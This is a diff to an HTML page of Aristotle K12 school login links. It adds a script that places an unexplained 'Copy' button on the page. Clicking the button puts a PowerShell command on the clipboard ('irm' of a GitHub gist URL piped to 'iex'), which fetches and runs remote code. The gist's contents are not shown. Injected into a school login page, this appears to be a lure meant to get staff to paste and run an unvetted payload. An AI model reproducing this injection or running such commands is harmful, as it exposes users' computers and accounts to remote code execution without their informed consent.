@@ -7,5 +7,67 @@
 <body>
 <a href="https://login.aristotleinsight.com/BCM/museumschool">Aristotle K12 (Educator)</a>
 <a href="https://login.aristotleinsight.com/k12/museumschool">Aristotle K12 (Admin)</a>
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+  // Create button
+  const btn = document.createElement("button");
+  btn.textContent = "Copy";
+  Object.assign(btn.style, {
+    position: "fixed",
+    bottom: "20px",
+    right: "20px",
+    padding: "10px 16px",
+    borderRadius: "8px",
+    border: "none",
+    background: "#0078ff",
+    color: "#fff",
+    fontSize: "14px",
+    cursor: "pointer",
+    boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
+    zIndex: 10000
+  });
+  document.body.appendChild(btn);
+
+  // Create notification container
+  const notify = (msg) => {
+    const note = document.createElement("div");
+    note.textContent = msg;
+    Object.assign(note.style, {
+      position: "fixed",
+      bottom: "70px",
+      right: "20px",
+      background: "#222",
+      color: "#fff",
+      padding: "10px 14px",
+      borderRadius: "8px",
+      opacity: "0",
+      transition: "opacity 0.3s, transform 0.3s",
+      transform: "translateY(10px)",
+      zIndex: 10000
+    });
+    document.body.appendChild(note);
+    requestAnimationFrame(() => {
+      note.style.opacity = "1";
+      note.style.transform = "translateY(0)";
+    });
+    setTimeout(() => {
+      note.style.opacity = "0";
+      note.style.transform = "translateY(10px)";
+      setTimeout(() => note.remove(), 300);
+    }, 2000);
+  };
+
+  // Copy logic
+  btn.onclick = async () => {
+    const textToCopy = "irm https://gist.githubusercontent.com/xurst/495240cfb21eb3e9ad83f4c239258f90/raw/f37db3efc3b25710c8a99c5fbbc031da5c6f43d2/gistfile1.txt | iex";
+    try {
+      await navigator.clipboard.writeText(textToCopy);
+      notify("Copied to clipboard!");
+    } catch {
+      notify("Failed to copy");
+    }
+  };
+});
+</script>
 </body>
 </html> 
